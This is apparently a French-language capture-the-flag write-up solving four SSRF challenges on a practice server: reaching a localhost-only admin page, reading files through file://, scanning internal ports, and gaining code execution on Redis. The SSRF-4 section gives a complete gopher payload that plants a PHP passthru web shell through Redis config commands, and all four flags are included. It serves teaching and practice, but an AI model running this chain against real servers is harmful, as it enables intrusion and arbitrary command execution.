# SSRF-1

## Description

Initiation aux Server Side Request Forgery (SSRF) attacks. Lire les instructions données sur `ssrf.unitedctf.ca` attentivement.

## Solution

Tel qu'indiqué dans les consignes, nous devons accéder à /admin.php. Malheureusement, la page s'affiche uniquement si la requête provient de localhost. On peut utiliser le scan pour contourner cette restriction puisque la requête proviendra du serveur lui-même. Il faut donc scanner l'url: `http://localhost/admin.php` pour avoir le premier flag.

## Flag 

`FLAG-2432a0b57e03c3b365296c9ad898bc2a`

<br />

# SSRF-2

## Description

Lire le fichier `/var/www/html/admin.php` sur `ssrf.unitedctf.ca`. Il est fortement recommandé d'avoir réussi SSRF-1 avant de tenter ce challenge.

## Solution

Il est possible d'utiliser le protocole `file` pour lire le fichier. Il faut donc scanner l'url: `file://localhost/var/www/html/admin.php` pour avoir le deuxième flag.

## Flag 

`FLAG-1ad0b1f556c689d0dd4301ca757ce9c3`

<br />

# SSRF-3

## Description

Une application roule à l'interne sur le serveur `ssrf.unitedctf.ca`. Cette application n'est pas accessible de l'externe, mais vous devez trouver sur quel port à l'interne celle-ci écoute. Pour faciliter votre recherche, limitez-vous aux ports `6000` à `6500`. Il est fortement recommandé d'avoir réussi SSRF-2 avant de tenter ce challenge. Le flag est FLAG-md5(port trouvé). Si vous trouvez le port `6123`, le flag serait FLAG-4ca82b2a861f70cd15d83085b000dbde.

## Solution

Il faut écrire un script qui test chaque port entre 6000 et 6500. Tous les ports répondront avec un `Connection refused` à l'exception du port `6379`. Voir [Solveur](./solver3.py) pour l'implémentation de la solution.

## Flag 

`FLAG-92c3b916311a5517d9290576e3ea37ad`

## Annexe

[Solveur](./solver3.py)

<br />

# SSRF-4

## Description

Après avoir complété SSRF-3, vous devriez avoir trouvé un port ouvert à l'intene sur `ssrf.unitedctf.ca`. Vous devez maintenant trouver quelle application écoute sur ce port et l'exploiter afin d'obtenir du `Remote Code Execution` (RCE). Une fois l'exécution de code achevée, exécutez le binaire `/flag` pour obtenir le flag final.

Ce challenge est beaucoup plus difficile que les 3 précédents, mais en cherchant bien sur votre moteur de recherche préféré vous devriez y parevenir! Suivez ces étapes:

1) Trouvez quelle application écoute sur le port trouvé. Une recherche avec le numéro du port devrait être suffisante, c'est une application très populaire.

2) Cherchez comment exploitez l'application à l'aide d'un ssrf. Recherchez `nom_application ssrf cheatsheet`, il devrait y avoir de bon résultats.

3) Exploitez l'application, devenez un master hacker.



## Solution

Il est attendu que le participant aura trouvé que l'application sur le port 6379 est redis par le fait que c'est la seule application très connu sur ce port et par le message d'erreur retourné lors qu'on scan ce port. Une fois découvert, nous pouvions allez lire sur la documentation de redis et voir que la communication avec cette application ce fait en plain text, et la liste de commande que l'on peut lui envoyer se trouve [ici](https://redis.io/commands).

La prochaine étape est de trouver un protocol capable de communiquer avec redis sans problème. HTTP est problématique, car une requète HTTP contient de l'information que redis ne comprendra pas. Par example, une requète curl à l'url `http://localhost:6379/test` enverra:

```
GET /test HTTP/1.1
Host: localhost:6379
User-Agent: curl/7.58.0
Accept: */*
```

Redis ne comprend évidemment aucune de ses lignes. Nous pouvons plutôt utiliser le protocol `gopher`, qui lui envoit strictement les bytes demandés. Ainsi, `gopher://localhost:6379/_test` enverra:
```
test
```

Prenez note que le premier byte après le dernier `/` est ignoré (`_` dans notre cas). Nous pouvons utiliser gopher pour parler avec redis et lui envoyer des commandes arbitraires. Les commandes qui nous intéresse sont:

`flushall` pour travailler avec une base de donnée vide.

`set x "<?php passthru($_GET['cmd']); ?>"` placera notre payload en plain text dans le fichier de la base de donnée.

`config set dir /var/www/html` pour indiqué à redis dans quel directory le fichier de db doit se situé. Nous voulons que celui-ci soit dans /var/www/html pour que nous puissions y avoir accès.

`config set dbfilename my_shell.php` pour setté le nom de notre shell (my_shell.php).

`save` pour sauvegardé le fichier de la db sur le filesystem.

`quit` pour indiquer à redis que la connection est terminé.

Chaque commande doit être séparée par un newline (`\r\n`). Notre payload final est donc:

```
flushall
set x "<?php passthru($_GET['cmd']); ?>"
config set dir /var/www/html
config set dbfilename my_shell.php
save
quit
```

Ce payload doit être url encoded, ce qui donne `flushall%0D%0Aset%20x%20%22%3C%3Fphp%20passthru%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%0D%0Aconfig%20set%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0Aconfig%20set%20dbfilename%20my_shell.php%0D%0Asave%0D%0Aquit`

Nous ajoutons le payload à la requête gopher, sans oublier d'ajouter le byte ignoré: `gopher://localhost:6379/_flushall%0D%0Aset%20x%20%22%3C%3Fphp%20passthru%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%0D%0Aconfig%20set%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0Aconfig%20set%20dbfilename%20my_shell.php%0D%0Asave%0D%0Aquit`

Une fois l'url scanné, il est possible d'accéder à notre shell à `http://ssrf.unitedctf.ca/my_shell.php`. Nous pouvons exécuter des commandes arbitraires avec le paramètre `cmd`: `http://ssrf.unitedctf.ca/my_shell.php?cmd=/flag`

Plutôt que de le faire à la main, vous pouvez également utiliser [Gophereus](https://github.com/tarunkant/Gopherus), qui permet de générer plusieurs payloads SSRF contre différentes applications (dont redis).

## Flag 

`FLAG-a0577776397de8ec3b216514a0930f47`
